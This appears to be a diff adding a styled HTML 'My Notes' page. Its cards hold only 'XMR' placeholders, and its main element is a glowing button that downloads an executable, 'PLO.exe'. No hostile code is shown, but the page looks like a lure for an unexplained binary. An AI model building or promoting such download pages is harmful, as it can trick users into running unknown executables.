@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>My Notes</title>
+
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: Arial, sans-serif;
+      max-width: 700px;
+      margin: auto;
+      padding: 40px;
+      text-align: center;
+      color: white;
+
+      /* Animated gradient background */
+      background: linear-gradient(-45deg, #0f2027, #203a43, #2c5364, #000000);
+      background-size: 400% 400%;
+      animation: gradientBG 10s ease infinite;
+    }
+
+    @keyframes gradientBG {
+      0% { background-position: 0% 50%; }
+      50% { background-position: 100% 50%; }
+      100% { background-position: 0% 50%; }
+    }
+
+    h1 {
+      margin-bottom: 30px;
+      font-size: 2.5em;
+      animation: fadeIn 1s ease-in;
+    }
+
+    /* Glassmorphism note cards */
+    .note {
+      background: rgba(255, 255, 255, 0.1);
+      backdrop-filter: blur(10px);
+      padding: 20px;
+      margin: 15px 0;
+      border-radius: 15px;
+      text-align: left;
+      box-shadow: 0 8px 20px rgba(0,0,0,0.3);
+      animation: slideUp 0.8s ease;
+      transition: 0.3s;
+    }
+
+    .note:hover {
+      transform: translateY(-5px) scale(1.02);
+    }
+
+    .download-section {
+      margin-top: 60px;
+      animation: fadeIn 2s ease;
+    }
+
+    /* Bouncing arrow */
+    .arrow {
+      font-size: 35px;
+      margin: 10px 0;
+      animation: bounce 1.5s infinite;
+    }
+
+    @keyframes bounce {
+      0%, 100% { transform: translateY(0); }
+      50% { transform: translateY(10px); }
+    }
+
+    /* Cool glowing button */
+    .download-btn {
+      display: inline-block;
+      padding: 15px 35px;
+      font-size: 18px;
+      color: white;
+      text-decoration: none;
+      border-radius: 10px;
+      background: linear-gradient(45deg, #00c6ff, #0072ff);
+      box-shadow: 0 0 10px rgba(0,198,255,0.7);
+      transition: 0.3s;
+    }
+
+    .download-btn:hover {
+      transform: scale(1.1);
+      box-shadow: 0 0 20px rgba(0,198,255,1);
+    }
+
+    /* Animations */
+    @keyframes fadeIn {
+      from { opacity: 0; }
+      to { opacity: 1; }
+    }
+
+    @keyframes slideUp {
+      from {
+        transform: translateY(30px);
+        opacity: 0;
+      }
+      to {
+        transform: translateY(0);
+        opacity: 1;
+      }
+    }
+
+  </style>
+</head>
+
+<body>
+
+  <h1>$</h1>
+
+  <div class="note">
+    <h3>XMR</h3>
+    <p>XMR</p>
+  </div>$
+
+  <div class="note">
+    <h3>xmr</h3>
+    <p>xmr</p>
+  </div>
+
+  <div class="download-section">
+    <h2>Click down here to download</h2>
+    <div class="arrow">⬇️</div>
+
+    <a class="download-btn" href="PLO.exe" download>
+      🚀 Download File
+    </a>
+  </div>
+
+</body>
+</html>
